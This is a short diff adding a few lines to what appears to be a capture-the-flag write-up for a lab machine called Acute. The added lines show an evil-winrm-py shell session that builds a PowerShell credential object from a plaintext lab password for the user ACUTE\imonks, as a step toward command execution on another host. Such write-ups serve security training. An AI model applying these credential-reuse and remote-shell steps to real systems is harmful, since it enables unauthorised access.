@@ -432,6 +432,11 @@ There also isnt much in bloodhound
 
 # Command execution on `ATSSERVER` from `Acute-PC01`
 
+```python
+evil-winrm-py PS C:\Users\edavies\Documents> $pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+evil-winrm-py PS C:\Users\edavies\Documents> $cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)
+```
+
 
 
 
